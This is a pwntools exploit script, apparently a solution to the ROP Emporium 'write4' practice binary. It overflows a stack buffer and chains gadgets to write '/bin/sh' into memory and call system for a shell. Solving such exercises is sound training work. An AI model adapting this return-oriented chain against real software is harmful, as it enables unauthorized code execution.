from pwn import *

r = process('./write4')
raw_input()

l_shl_code = '/bin/sh\x00'
r_shl_code = '/sh    \x00'
shl_addr = 0x00601050
call_sys = 0x004005e0

mv_data  = 0x0000000000400821 # mov dword ptr [rsi], edi ; ret

pop_rdi = 0x0000000000400893 # pop rdi ; ret
pop_rsi = 0x0000000000400891 # pop rsi ; pop r15 ; ret

offset = 0x28

p = 'a' * offset
p += p64(pop_rdi)
p += l_shl_code
p += p64(pop_rsi)
p += p64(shl_addr)
p += p64(0)
p += p64(mv_data)

p += p64(pop_rdi)
p += r_shl_code
p += p64(pop_rsi)
p += p64(shl_addr + 4)
p += p64(0)
p += p64(mv_data)

p += p64(pop_rdi)
p += p64(shl_addr)
p += p64(call_sys)

r.sendline(p)


r.interactive()
